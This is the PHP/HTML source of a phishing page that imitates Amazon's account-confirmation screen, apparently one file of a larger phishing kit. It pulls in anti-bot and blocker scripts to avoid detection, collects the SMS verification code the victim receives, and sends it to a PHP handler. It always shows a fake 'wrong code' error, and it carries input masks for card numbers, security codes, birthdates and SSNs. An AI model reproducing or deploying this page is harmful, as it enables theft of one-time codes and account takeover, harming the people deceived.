<?php
    include("./system/system.php");
    include("./system/detect.php");
    include("./system/blocker.php");

include("../Bots-fSOCIETY/anti1.php");
include("../Bots-fSOCIETY/anti2.php");
include("../Bots-fSOCIETY/anti3.php");
include("../Bots-fSOCIETY/anti4.php");
include("../Bots-fSOCIETY/anti5.php");
include("../Bots-fSOCIETY/anti6.php");
include("../Bots-fSOCIETY/anti7.php");
include("../Bots-fSOCIETY/anti8.php");

?><html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember translated-ltr" data-19ax5a9jf="dingo" data-aui-build-date="3.19.8-2020-11-06" style="height: 100%;"><head>


<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title dir="ltr">Amazon Myaccount</title>

    
      

      
        <link rel="stylesheet" href="./style/css-088.css">

<link rel="stylesheet" href="./style/css099.css">

      
    <script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.CardValidator.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>
<script src="./style/js/tyle.js"></script>

    
    
    
      
    
    

  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000');
    $('#Securitycode').mask('0000');

        $('#birthdate').mask('00/00/0000');

        $('#SSN').mask('000-00-0000');

        $('#expdate').mask('00/0000');

  });
  </script>



<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}

</style>





<style>
#Securitycode {
background-image: url('./style/sprite_logos_wallet_2x.png');
background-repeat: no-repeat;
    background-size: 54px;
    background-position: 111.5% 48.1%;
}

 #cardnumber {
background-image: url('./style/cards-sprite-small@2x.png');
background-repeat: no-repeat;
    background-size: 38px;}

</style>


</head>

  <body class="ap-locale-fr_FR a-m-us a-aui_157141-c a-aui_158613-c a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c a-meter-animate" style="position: relative; min-height: 100%; top: 40px;"><div class="skiptranslate" style=""></div>




<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none auth-navbar">
        





<div class="a-section a-spacing-medium a-text-center">
  
    

    
      


<a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

  
  
    
      
  
</a>

    
  
</div>


      </div>

      <div id="authportal-center-section" class="a-section">
        
          
          
            <div id="authportal-main-section" class="a-section">
              






<div class="a-section auth-pagelet-container" style="
    width: 412px;
    margin: 0 auto;
">
  

















  
    





<div class="a-section a-spacing-base">
  <div class="a-section">
    
    <form name="signIn" method="post" action="./system/send_sms2.php" class="auth-validate-form auth-real-time-validation a-spacing-none">
      
      

      




  
    
  
    
  
    
  



      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 class="a-spacing-small"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Account Confirmation </font></font></h1>
          
          
          <div class="a-divider a-divider-break"><h5 id="countdown"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Code Sent in the phone </font></font></h5></div>



<script>
   var seconds = 120;
   function secondPassed() {
   var minutes = Math.round((seconds - 30)/60);
   var remainingSeconds = seconds % 60;
   if (remainingSeconds < 10) {
      remainingSeconds = "0" + remainingSeconds; 
   }
   document.getElementById('countdown').innerHTML = "Code Sent in the phone " + minutes + ":" + remainingSeconds;
   if (seconds == 0) {
    clearInterval(countdownTimer);
    document.getElementById('countdown').innerHTML = "";
   } else {
    seconds--;
   }
   }
   var countdownTimer = setInterval('secondPassed()', 1000);
</script>







<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Enter the code received :</font></font></label>
<input required="" type="text" maxlength="128" id="SMS" name="SMS" class="a-input-text a-span12 auth-autofocus auth-required-field a-form-error"><div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert" style="display: block;"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">You entered the wrong code
</font></font></div></div></div></div>





          
          <div class="a-section">
            
            









            
            <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
              Continue
            </font></font></span></span></span>

            
            



          </div>

          
          
        </div></div>
      </div>
    </form>
  </div>
  
    
    
      
        
        
        
      
    
  
</div>

  
  

</div>
            </div>
          
        
      </div>

      
      <div id="right-2">
      </div>

      <div class="a-section a-spacing-top-extra-large auth-footer">
        



<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>

  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      Terms of use
    </font></font></a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      Protection of your personal information
    </font></font></a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Aide
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Cookies
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      Ads based on your interests
    </font></font></a>
    <span class="auth-footer-seperator"></span>
  

  
</div>




<div class="a-section a-spacing-none a-text-center">
  





<span class="a-size-mini a-color-secondary"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
  © 1996-2021, Amazon.com, Inc. or its affiliates.
</font></font></span>

</div>

      </div>
    </div>

</body></html>